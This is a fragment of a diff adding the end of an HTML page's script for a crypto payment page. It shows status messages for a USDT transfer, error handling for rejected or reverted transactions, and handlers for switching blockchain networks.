+                    setStatus('✓ Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="' + explorer + tx.hash + '" target="_blank">View Transaction</a>', 'ok');
+                    btn.style.display = 'none';
+                } else {
+                    setStatus('Transaction reverted.', 'error');
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                const msg = err.message || String(err);
+                setStatus(msg.includes('rejected') ? 'Rejected in wallet.' : 'Error: ' + msg.slice(0, 80), 'error');
+                btn.disabled = false;
+            }
+        }
+
+        // Network switch handlers
+        document.querySelectorAll('.network-option').forEach(function(btn) {
+            btn.addEventListener('click', async function() {
+                if (btn.classList.contains('active')) return;
+                document.querySelectorAll('.network-option').forEach(function(b) {
+                    b.classList.remove('active');
+                });
+                btn.classList.add('active');
+                await switchNetwork(btn.dataset.chain);
+            });
+        });
+
+        init();
+    </script>
 </body>
 </html>
